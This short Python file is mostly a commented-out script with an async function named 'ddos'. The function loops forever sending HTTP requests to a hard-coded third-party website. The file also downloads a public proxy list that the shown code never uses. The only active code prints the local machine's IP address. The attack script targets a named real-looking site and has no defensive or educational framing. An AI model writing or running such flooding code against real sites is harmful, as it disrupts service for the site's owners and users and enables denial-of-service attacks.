
# import aiohttp
# import requests
# import asyncio
# import random

# http_proxies = requests.get(
#     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.split("\n")

# async def ddos(url):
#     while True:
#         async with aiohttp.ClientSession() as session:
#             async with session.get(url) as response:
#                 print(response.status)


# if __name__ == "__main__":
#     loop = asyncio.get_event_loop()
#     loop.run_until_complete(ddos("https://onlinedataentryjob.com"))


import socket

print(socket.gethostbyname(socket.gethostname()))